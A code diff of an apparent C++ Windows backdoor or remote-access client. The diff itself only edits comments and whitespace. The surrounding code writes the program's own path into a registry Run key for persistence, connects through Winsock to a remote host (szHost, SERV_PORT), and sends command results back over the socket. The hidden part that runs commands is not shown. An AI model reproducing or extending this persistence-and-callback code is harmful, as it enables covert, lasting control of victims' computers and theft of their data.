@@ -24,7 +24,7 @@ int main(const int argc, const char* argv[]){
         KEY_WRITE,
         &hKey
     ); /* wont bother handling errors */
-    // = Get the path of the executable in its current location
+    // = Get the path of the executable in its current location (store in szPath)
     char szPath[MAX_PATH];
     DWORD dwSize = GetModuleFileName(NULL, szPath, MAX_PATH);
     // = Edit the run key
@@ -46,26 +46,22 @@ int main(const int argc, const char* argv[]){
     if(WSAStartup(DllVersion, &wsaData) != 0){ // Initiate use of the winsock DLL
         ExitProcess(EXIT_FAILURE);
     }
-
     // == Create socket
     SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
     if(!sock){
         ExitProcess(EXIT_FAILURE);
     }
-
     // == Get server info
     HOSTENT* host = gethostbyname(szHost);
     if(host == nullptr){
         ExitProcess(EXIT_FAILURE);
     }
-
     // == Define server info
     SOCKADDR_IN sin;
     ZeroMemory(&sin, sizeof(sin)); // Make sure the whole struct is set to 0
     sin.sin_port = htons(SERV_PORT);
     sin.sin_family = AF_INET;
     memcpy(&sin.sin_addr.S_un.S_addr, host->h_addr_list[0], sizeof(sin.sin_addr.S_un.S_addr)); // Copy address into sin...S_addr
-
     // == Connect to the server
     if(connect(sock, (const sockaddr*)&sin, sizeof(sin)) != 0){
         ExitProcess(EXIT_SUCCESS);
@@ -90,6 +86,8 @@ int main(const int argc, const char* argv[]){
         std::cout << "SNDRSLT: " << result << std::endl;
         send(sock, result.c_str(), result.length(), 0);
 	}
+
+    // === Cleanup
     closesocket(sock);
     ExitProcess(EXIT_SUCCESS); // Like return, but the OS/kernel likes it a bit more - best practice
 }
